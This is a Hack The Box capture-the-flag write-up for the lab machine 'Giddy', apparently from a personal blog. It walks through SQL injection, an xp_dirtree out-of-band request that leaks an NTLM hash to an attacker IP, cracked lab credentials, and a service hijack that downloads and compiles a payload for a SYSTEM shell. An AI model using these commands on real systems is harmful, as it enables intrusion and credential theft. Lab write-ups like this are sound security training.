---
layout: post
title: HTB Giddy -- medium
---

Quick overview:
IIS Server hosting site with SQLi vulnerbility. 
Use dirtree to execute Out-of-Band SQLi to responder to capture netNTLM hash. Crack the hash with hashcat for credentialed access via winrm. 
Log in as Stacy and find constrained powershell and Windows Defender. Enumerate and find vulnerable Unifi-Video service.
Use the Spookflare dropper and loader to drop a .cs payload in the directory of the service (\ProgramData\unifi-video\payload.cs) then used ‘lolbin’ cse.exe to compile the cs file. 
Restart the service and get an Administrator shell.

Starting off with an nmap scan, increasing the `--min-rate` and lowering the `--max-retries` to quickly scan every tcp port, we find web services running on 
ports 80 and 443 as well as RDP and WinRM services running on 3389 and 5985 respectively.

```
# Nmap 7.70 scan initiated Sat Sep 22 10:48:16 2018 as: nmap -sC -sV -Pn -vv --min-rate 1000 --max-retries 1 -p- -oA fast-all-tcp-scan --open 10.10.10.104
Nmap scan report for 10.10.10.104
Host is up, received user-set (0.50s latency).
Scanned at 2018-09-22 10:48:16 EDT for 154s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-06-16T21:28:55
| Not valid after:  2018-09-14T21:28:55
| MD5:   78a7 4af5 3b09 c882 a149 f977 cf8f 1182
| SHA-1: 8adc 3379 878a f13f 0154 406a 3ead d345 6967 6a23
| -----BEGIN CERTIFICATE-----
| MIICHTCCAYagAwIBAgIQG2rbVjzfZqJIr005rMK4xTANBgkqhkiG9w0BAQUFADAp
| MScwJQYDVQQDDB5Qb3dlclNoZWxsV2ViQWNjZXNzVGVzdFdlYlNpdGUwHhcNMTgw
| NjE2MjEyODU1WhcNMTgwOTE0MjEyODU1WjApMScwJQYDVQQDDB5Qb3dlclNoZWxs
| V2ViQWNjZXNzVGVzdFdlYlNpdGUwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGB
| ALOvHao3JEpJzzBHR9oCc+934QLPu2vRlC7jZAwySPX6v6fkvzsDr7uD50maLVtW
| 9etn9KVwfmgkYd6YtY+86YCc935s1rppNtNKeVXsG/PM4G+4HdPFf1Ik3Vj6fc1y
| w1nx2PLSNvlC74kkc33MA8y//vxqIckSJiHiVa5ZzdR/AgMBAAGjRjBEMBMGA1Ud
| JQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBS4T3PavA05OLCMaCa6GqgXsjCoozAO
| BgNVHQ8BAf8EBAMCBSAwDQYJKoZIhvcNAQEFBQADgYEAm6FzHooZ+SSLNp9KvPdX
| jjFPpf9Jv4j8Ao9qv1RnbwmTE5SSHhusXDOiAIOsErTVdaNa0VRcduMt+H054kfp
| 1MeoYvKXuXlMLbGe+orEIiVPjC/7cTJIVyfgyhdl5PdtetlZGrspK8h+2QqvxXpF
| im+bXy93yFQ6G9tOrzpBmFY=
|_-----END CERTIFICATE-----
|_ssl-date: 2018-09-22T14:45:44+00:00; -5m03s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Issuer: commonName=Giddy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-16T01:04:03
| Not valid after:  2018-12-16T01:04:03
| MD5:   b47a f83e d35a f9ce a8f2 3f12 553a 9d64
| SHA-1: e983 d0c5 32d9 1bff bb6c 39dd 3a9e 572d b451 f4ec
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQfSH4DfRyF5NCIy8oSsHfrTANBgkqhkiG9w0BAQsFADAQ
| MQ4wDAYDVQQDEwVHaWRkeTAeFw0xODA2MTYwMTA0MDNaFw0xODEyMTYwMTA0MDNa
| MBAxDjAMBgNVBAMTBUdpZGR5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEA3y0jlRGIQp0h+vm1uicIT17fmPX/TunxMJLoYMt8VNIk+y1o7IODDHEGrvLc
| 5CRHN5q5PcFkPiBZTMBgr4dytGeZ5oULQn4+/4J+BSOEj0Bt/bvfxxLKXSDT0R/V
| pYbi60sq+S0x/58uV2YzyNasErEBkpoxg4RWZMAJwAZ/BILpbco79swPZjo0pCkg
| +JY+ZrUPz7DhkPEIFPgyXWrob39UECrqDVGeBZCdb/l6zTpkDMuZaC6Ii1QtQ3RK
| KJEqLujC8iI21xUQL4x4HJFowytSVVVDjsjcZD4R/nztkOazvqiMr+T4M9RoLBsx
| s9SDnTT4PnEZxiCSf0WRZM3K4QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKsIrKXwUFq9UGUZSLcP
| e1S6m16BIBSOowftntZ9/hKPe7ho20tArV7DE3zGD3IiUt65Ktcwp2JwCmFR241G
| gTURI+RWQAyLxwB24Y40Pt9rDSnxH77mVS3rcvsubmDIOERpnnapJXqeq32UYw0c
| 8bEHWEJKJLzbmjEvjh1IWTyEY3JAqzZAoGoHzCuYUZzrt7BUo37S6is39dL1hU0f
| g9MZTfIDuqL8nut1/ejfL+nN7kdqCfS5usBouOnpdlbjY43snVFITWbuWnEF18s7
| 1Z8M7kwq2WZZ7fTCyDo9uONrfmxZtQk1bDE/QJlbr71hfn0u45KAj9taWOsmns5Q
| guY=
|_-----END CERTIFICATE-----
|_ssl-date: 2018-09-22T14:45:44+00:00; -5m02s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m02s, deviation: 0s, median: -5m03s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 22 10:50:50 2018 -- 1 IP address (1 host up) scanned in 153.96 seconds
```

No credential yet to log in to either RDP or WinRM and brute forcing is unlikely without even a user name to go on I take a look at the web site.

![](https://braaaax.github.io/braaaax.github.io/images/giddy-mvc.png)

We see it's a sales site. It's managing its inventory with a database on the backend that it accessing with a GET request ie `GET /mvc/Product.aspx?ProductSubCategoryId=18`

This looks like an opportunity for SQL injection. So we capture the request in Burp Suite.

```
GET /mvc/Product.aspx?ProductSubCategoryId=18 HTTP/1.1
Host: giddy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://giddy.htb/mvc/
Cookie: .redirect.=3891ECAA60B1511BE0B3BE314EAB9C9082A082F1755D5C485DFE7B6CE27AA7CC03FD824DD9CB06D2D5C5B470A84AF87BAAED0B7877A16FA21B09BB0E0C1FF51753F891E0670C2A44B940BD18922267B72C5C0E2F12E244921B89ACA7E74673E1D6008AAD630C505B23C4447BE181519A037DE150326090D3936F41135D5DAAC5; ASP.NET_SessionId=lunz1qjw14x3aoyc0yrhpzx3; __AntiXsrfToken=85c10a48e20b4503a77526ffa0b5ea36
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Running sqlmap with the saved product request from above returns a vulnerable injection point.

`sqlmap -r product.req`

```
GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
---
Parameter: ProductSubCategoryId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ProductSubCategoryId=18 AND 1781=1781

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ProductSubCategoryId=18 AND 1834 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1834=1834) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(113)))                                                                                              

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3086=3086) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(113))                                                                                                               

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: ProductSubCategoryId=18;WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: ProductSubCategoryId=18 WAITFOR DELAY '0:0:5'

    Type: UNION query
    Title: Generic UNION query (NULL) - 25 columns
    Payload: ProductSubCategoryId=18 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113)+CHAR(72)+CHAR(76)+CHAR(111)+CHAR(85)+CHAR(105)+CHAR(108)+CHAR(114)+CHAR(72)+CHAR(80)+CHAR(89)+CHAR(89)+CHAR(116)+CHAR(72)+CHAR(109)+CHAR(68)+CHAR(109)+CHAR(69)+CHAR(72)+CHAR(115)+CHAR(87)+CHAR(104)+CHAR(98)+CHAR(108)+CHAR(116)+CHAR(115)+CHAR(100)+CHAR(76)+CHAR(116)+CHAR(106)+CHAR(97)+CHAR(73)+CHAR(100)+CHAR(68)+CHAR(83)+CHAR(122)+CHAR(121)+CHAR(98)+CHAR(97)+CHAR(112)+CHAR(67)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AuQr
---
```

There is nothing of interest in the database so I try to get a hash (NTLMv2) with:

`/mvc/Product.aspx?ProductSubCategoryId=18;declare @q varchar(99);set @q='\\10.10.14.8\test1'; exec master.dbo.xp_dirtree @q`

![](https://braaaax.github.io/braaaax.github.io/images/giddy-out-of-band.png)

Which I catch with Responder

![](https://braaaax.github.io/braaaax.github.io/images/giddy-responder.png)

The hash gives us a username in the first section: Stacy

Relaying is out of the question since there is only one box and we can't relay back to the same box. So I try to crack the hash with hashcat and it works!

![](https://braaaax.github.io/braaaax.github.io/images/giddy-hashcat.png)

Now we have credentials for our user Stacy

```
DOMAIN\User: GIDDY\Stacy
Password: xNnWo6272k7x
```

I hop on over to my Win10 VM, because I hate using the ruby and python winrm scripts as they drop the connection too often, and nothing beats a Windows box for WinRM sessions.

I add these commands to configure my session:

```
winrm quickconfig
Enable-WSManCredSSP -Role Client -DelegateComputer compatibility
winrm set winrm/config/client '@{TrustedHosts="10.10.10.104"}'
$username = 'Stacy'
$password = 'xNnWo6272k7x'
$securepass = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepass
$session = New-PSSession -ComputerName 10.10.10.104 -Credential $credential
```

I begin my enumeration, but it isn't until I read `\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` that I find the vulnerable service. 

The plan is to restart the service, which is run as a privileged user, and upon restart my compiled malware will be executed and I will get a call back as System.

![](https://braaaax.github.io/braaaax.github.io/images/giddy-spookflare.png)


```
Invoke-WebRequest -outfile \ProgramData\unifi-video\payload.cs http://10.10.14.8/payload.cs
\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:\ProgramData\unifi-video\taskkill.exe \ProgramData\unifi-video\payload.cs
Stop-Service -Name Unifivideoservice -Force
Start-Service -Name Unifivideoservice
```

Success. System rooted. 

![](https://braaaax.github.io/braaaax.github.io/images/giddy-final.png)

